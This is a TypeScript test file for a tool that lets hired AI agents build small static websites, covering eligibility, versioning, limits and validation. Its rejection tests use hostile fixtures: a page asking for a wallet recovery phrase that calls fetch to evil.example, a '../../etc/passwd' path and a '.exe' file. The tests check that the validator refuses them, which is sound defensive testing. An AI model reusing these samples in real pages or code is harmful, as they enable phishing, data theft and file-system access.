// Agents that build, phase 1: the tool an agent builds with. Which hires get it, what a build keeps, how a second
// call changes what was built, what is refused and how the agent hears it, and the limits.
import { describe, it, expect, beforeEach } from "vitest";
import { getDb } from "@/lib/db";
import { filesOf, getSite, siteOfTask, versionsOf } from "@/lib/agentSites";
import { asksToBuild, BUILD_MAX_TOKENS, BUILD_STEPS, BUILDS_PER_HIRE, buildTool, builtLine, canBuild, dailyBuilds, mayBuild, withBuild, type Built } from "@/lib/buildTool";

const ON = { AGENT_SITES: "on" };
const claude = { provider: "anthropic" as const, capabilities: ["research"] };

beforeEach(() => {
  getDb().exec("DELETE FROM built_site_reports; DELETE FROM built_site_files; DELETE FROM built_site_versions; DELETE FROM built_sites; DELETE FROM rate_limit_windows;");
});

const html = (body: string) => `<!doctype html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"><title>T</title><link rel="stylesheet" href="style.css"></head><body>${body}<script src="app.js"></script></body></html>`;
const tool = (o: Partial<Parameters<typeof buildTool>[0]> = {}, seen: Built[] = []) =>
  buildTool({ taskId: "t1", agentId: "agent-1", ownerMark: "0xabc", paid: false, env: ON, onBuilt: (b) => seen.push(b), ...o });

describe("which hires get the build tool", () => {
  it.each([
    "Build me a landing page for my coffee truck",
    "make a tip calculator I can open on my phone",
    "Create a quiz about the solar system",
    "I need a dashboard for these numbers",
    "Can you code a small app that tracks my water intake?",
    "design a one-pager for the launch",
    "Put together an interactive countdown to 1 January",
    "build a simple game where you catch the falling stars",
    "Make a form people can fill in to RSVP",
  ])("a hire that asks for something built: %s", (job) => {
    expect(asksToBuild(job)).toBe(true);
    expect(mayBuild(claude, job, { env: ON })).toBe(true);
  });

  it.each([
    "Summarise this contract for me",
    "What is the price of ETH right now?",
    "Write a report on the tools market",
    "Make a picture of a fox in a suit",
    "Create a plan for my week",
    "Go to stripe.com/pricing and tell me the fees",
    "Translate this page into German",
  ])("and no plain job: %s", (job) => {
    expect(asksToBuild(job)).toBe(false);
    expect(mayBuild(claude, job, { env: ON })).toBe(false);
  });

  it("an agent whose job is building pages gets it for any hire; other models, crews, agents on their own server and outside tool servers never do", () => {
    expect(mayBuild({ provider: "anthropic", capabilities: ["Web development"] }, "anything at all", { env: ON })).toBe(true);
    expect(mayBuild({ provider: "anthropic", capabilities: ["frontend", "copywriting"] }, "anything at all", { env: ON })).toBe(true);
    const job = "Build me a landing page";
    expect(mayBuild({ provider: "openrouter" as never, capabilities: [] }, job, { env: ON })).toBe(false);
    expect(mayBuild({ provider: "anthropic", capabilities: [], orchestrator: { steps: [] } as never }, job, { env: ON })).toBe(false);
    expect(mayBuild({ provider: "anthropic", capabilities: [], endpoint: "https://a.example/agent" }, job, { env: ON })).toBe(false);
    expect(mayBuild(claude, job, { env: ON, viaMcp: true })).toBe(false);
    expect(mayBuild(claude, job, { env: {} })).toBe(false);
  });

  it("is added to an agent's tools once, beside whatever it already has", () => {
    const t = tool();
    const base = { serverTools: [], localTools: [{ ...t, name: "other" }], grants: ["other"] };
    const added = withBuild(base, t);
    expect(added.localTools.map((x) => x.name)).toEqual(["other", "build_page"]);
    expect(added.grants).toEqual(["other", "build_page"]);
    expect(canBuild(added)).toBe(true);
    expect(withBuild(added, t)).toBe(added);
    expect(withBuild(null, t).localTools).toHaveLength(1);
    expect(canBuild(base)).toBe(false);
  });

  it("gives a building job room to write a page and rounds to put it right", () => {
    expect(BUILD_MAX_TOKENS).toBeGreaterThanOrEqual(12_000);
    expect(BUILD_STEPS).toBeGreaterThanOrEqual(4);
    expect(BUILDS_PER_HIRE).toEqual({ free: 3, paid: 6 });
    expect(dailyBuilds({})).toBe(200);
    expect(dailyBuilds({ AGENT_SITES_DAILY_MAX: "25" })).toBe(25);
    expect(dailyBuilds({ AGENT_SITES_DAILY_MAX: "0" })).toBe(0);
    expect(dailyBuilds({ AGENT_SITES_DAILY_MAX: "many" })).toBe(200);
  });
});

describe("building", () => {
  it("keeps the files as the person's site, and tells the agent what happens next", async () => {
    const seen: Built[] = [];
    const said = await tool({}, seen).run({ title: "Tip calculator", note: "a tip calculator", files: [{ path: "index.html", content: html("<h1>Tips</h1>") }, { path: "style.css", content: "body{font:16px system-ui}" }, { path: "app.js", content: "const tip = (bill, pct) => bill * pct / 100;" }] });
    expect(said).toMatch(/^Built "Tip calculator": version 1, 3 files, [\d.]+ (KB|bytes)\. The person gets the link to open it with your answer\./);
    expect(said).toMatch(/without the code\. You can change it 2 more times in this job\.$/);
    const site = siteOfTask("t1")!;
    expect(site).toMatchObject({ title: "Tip calculator", agentId: "agent-1", ownerMark: "0xabc", version: 1, status: "live" });
    expect(filesOf(site.siteId).map((f) => f.path)).toEqual(["app.js", "index.html", "style.css"]);
    expect(versionsOf(site.siteId)[0]).toMatchObject({ version: 1, taskId: "t1", note: "a tip calculator", files: 3 });
    expect(seen).toHaveLength(1);
    expect(seen[0]).toMatchObject({ version: 1, files: 3, site: { siteId: site.siteId } });
    expect(seen[0].sha256).toMatch(/^[0-9a-f]{64}$/);
    expect(builtLine(seen[0])).toBe("Built Tip calculator");
  });

  it("a second call changes what was built: the files given take their place, the rest stay, and a file can be removed", async () => {
    const seen: Built[] = [];
    const t = tool({}, seen);
    await t.run({ title: "Tips", files: [{ path: "index.html", content: html("<h1>One</h1>") }, { path: "style.css", content: "h1{color:#333}" }, { path: "app.js", content: "let a = 1;" }, { path: "extra.svg", content: "<svg xmlns='http://www.w3.org/2000/svg'/>" }] });
    const said = await t.run({ title: "Tips, darker", note: "darker heading", files: [{ path: "./style.css", content: "h1{color:#000}" }], remove: ["extra.svg"] });
    expect(said).toMatch(/version 2, 3 files/);
    const site = siteOfTask("t1")!;
    expect(site).toMatchObject({ title: "Tips, darker", version: 2 });
    const now = Object.fromEntries(filesOf(site.siteId).map((f) => [f.path, f.content.toString()]));
    expect(Object.keys(now).sort()).toEqual(["app.js", "index.html", "style.css"]);
    expect(now["style.css"]).toBe("h1{color:#000}");
    expect(now["index.html"]).toContain("<h1>One</h1>");
    // the first version is still there, whole
    expect(filesOf(site.siteId, 1).map((f) => f.path)).toEqual(["app.js", "extra.svg", "index.html", "style.css"]);
    expect(builtLine(seen[1])).toBe("Changed Tips, darker: version 2");
    // one job, one site
    expect((getDb().prepare("SELECT COUNT(*) n FROM built_sites").get() as { n: number }).n).toBe(1);
  });

  it("carries on a site an earlier turn built, and starts a new one when that site is gone or down", async () => {
    await tool().run({ title: "Tips", files: [{ path: "index.html", content: html("<h1>One</h1>") }, { path: "app.js", content: "let a = 1;" }] });
    const first = siteOfTask("t1")!.siteId;
    await tool({ taskId: "t2", continueSite: first }).run({ title: "Tips", files: [{ path: "app.js", content: "let a = 2;" }] });
    expect(getSite(first)!.version).toBe(2);
    // the later job is told about the same site: it changed it
    expect(siteOfTask("t2")!.siteId).toBe(first);
    expect(versionsOf(first).map((v) => v.taskId)).toEqual(["t2", "t1"]);
    await expect(tool({ taskId: "t3", continueSite: "no-such-site" }).run({ title: "Fresh", files: [{ path: "app.js", content: "x" }] })).rejects.toThrow(/a site needs a file called index\.html/);
  });

  it("refuses a page that breaks a rule, keeps nothing of it, and says what to put right in words", async () => {
    const t = tool();
    await expect(t.run({ title: "Wallet check", files: [{ path: "index.html", content: html('<label>Recovery phrase</label><textarea></textarea><script>fetch("https://evil.example")</script>') }] }))
      .rejects.toThrow(/^Not built\. Put these right and build again:\n- index\.html: .*never asks for a secret[\s\S]*- index\.html: it calls out over the network/);
    const site = siteOfTask("t1")!;
    expect(site.version).toBe(0);
    expect(filesOf(site.siteId)).toEqual([]);
    // put right, it is kept as the first version of the same site
    expect(await t.run({ title: "Tip calculator", files: [{ path: "index.html", content: html("<h1>Tips</h1>") }] })).toMatch(/version 1, 1 file,/);
    expect((getDb().prepare("SELECT COUNT(*) n FROM built_sites").get() as { n: number }).n).toBe(1);
  });

  it.each([
    [{ title: "Tips", files: [] }, /Give the files to build/],
    [{ title: "Tips" }, /Give the files to build/],
    [{ title: "", files: [{ path: "index.html", content: "<p>x</p>" }] }, /title of a few words/],
    [{ title: "Tips", files: [{ path: "about.html", content: "<p>x</p>" }] }, /a site needs a file called index\.html/],
    [{ title: "Tips", files: [{ path: "index.html", content: "<p>x</p>" }, { path: "../../etc/passwd", content: "x" }] }, /is not a file name a site may use/],
    [{ title: "Tips", files: [{ path: "index.html", content: "<p>x</p>" }, { path: "tool.exe", content: "MZ" }] }, /not a kind of file a site may hold/],
    [{ title: "Tips", files: [{ path: "index.html", content: 42 }] }, /index\.html is empty/],
  ])("asks for what is missing: %j", async (args, why) => {
    await expect(tool().run(args as Record<string, unknown>)).rejects.toThrow(why);
  });

  it("holds a hire to its versions: three on a free hire, six on a paid one", async () => {
    const page = (n: number) => ({ title: "Tips", files: [{ path: "index.html", content: html(`<h1>${n}</h1>`) }] });
    const free = tool();
    for (let n = 1; n <= 3; n++) await free.run(page(n));
    await expect(free.run(page(4))).rejects.toThrow(/has built its 3 versions\. Go on with what is built\./);
    expect(await free.run(page(3)).catch((e: Error) => e.message)).toMatch(/3 versions/);
    const paid = tool({ taskId: "t2", paid: true });
    let last = "";
    for (let n = 1; n <= 6; n++) last = await paid.run(page(n));
    expect(last).toMatch(/That was the last version this job can build\.$/);
    await expect(paid.run(page(7))).rejects.toThrow(/its 6 versions/);
  });

  it("stops an agent that cannot get a build right, instead of letting it go round", async () => {
    const t = tool();
    const bad = { title: "Tips", files: [{ path: "index.html", content: html('<input type="password">') }] };
    for (let n = 0; n < 6; n++) await expect(t.run(bad)).rejects.toThrow(/Not built\./);
    await expect(t.run(bad)).rejects.toThrow(/Too many builds were refused/);
    expect(siteOfTask("t1")!.version).toBe(0);
  });

  it("holds the whole network to its day, and builds nothing while it is off", async () => {
    const page = { title: "Tips", files: [{ path: "index.html", content: html("<h1>x</h1>") }] };
    const capped = { ...ON, AGENT_SITES_DAILY_MAX: "2" };
    await tool({ taskId: "a", env: capped }).run(page);
    await tool({ taskId: "b", env: capped }).run(page);
    await expect(tool({ taskId: "c", env: capped }).run(page)).rejects.toThrow(/Nothing more can be built today/);
    await expect(tool({ taskId: "d", env: { ...ON, AGENT_SITES_DAILY_MAX: "0" } }).run(page)).rejects.toThrow(/Nothing more can be built today/);
    await expect(tool({ taskId: "e", env: {} }).run(page)).rejects.toThrow(/Nothing can be built right now/);
    expect(siteOfTask("c")).toBeNull();
    expect(siteOfTask("e")).toBeNull();
  });

  it("tells the agent the rules of the seal before it writes a line", () => {
    const d = tool().description;
    for (const must of [/index\.html is the page that opens/, /no script, style, font or picture loaded from another site/, /no call over the network/, /localStorage and cookies are not there/, /never asks for a password, a recovery phrase, a private key or a card/, /never connects a wallet/, /built for a phone first/, /do not paste the code into the answer/, /This job can build 3 versions/]) expect(d).toMatch(must);
    expect(tool({ paid: true }).description).toMatch(/This job can build 6 versions/);
    expect(d).not.toMatch(/—/);
  });
});
